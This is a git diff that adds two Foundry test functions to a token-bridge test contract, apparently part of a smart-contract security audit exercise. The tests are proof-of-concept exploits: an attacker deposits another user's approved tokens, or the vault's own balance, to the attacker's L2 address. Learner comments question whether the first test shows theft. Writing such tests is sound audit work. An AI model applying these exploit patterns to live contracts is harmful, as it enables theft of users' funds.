@@ -223,4 +223,37 @@ contract L1BossBridgeTest is Test {
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
     }
+
+    // £q I don't know if this actually shows alice's funds being stolen - they are still moved to the vault, right? 
+    // £a: bob is stealing alice's tokens on the L2! (by chaning l2Recipient in the emitted event). 
+    // Bob does not end up with more of the tokens in his account?! 
+    function testCanMoveApprovedTokensOfOtherUsers() public {
+        //userAlice
+        vm.startPrank(user);
+        token.approve(address(tokenBridge), type(uint256).max); 
+
+        //UserBob
+        uint256 depositAmount = token.balanceOf(user); 
+        address attacker = makeAddr("attacker"); 
+        vm.startPrank(attacker); 
+        vm.expectEmit(address(tokenBridge)); 
+        emit Deposit(user, attacker, depositAmount); 
+        tokenBridge.depositTokensToL2(user, attacker, depositAmount); 
+
+        assertEq(token.balanceOf(user), 0); 
+        assertEq(token.balanceOf(address(vault)), depositAmount); 
+        vm.stopPrank(); 
+    } 
+
+    
+    function testCanTransferFromVaultToVault() public {
+        address attacker = makeAddr("attacker");
+        uint256 vaultBalance = 500 ether;
+        deal(address(token), address(vault), vaultBalance); 
+
+        // the following should trigger deposit event. 
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, vaultBalance); 
+        tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 
+    }
 }
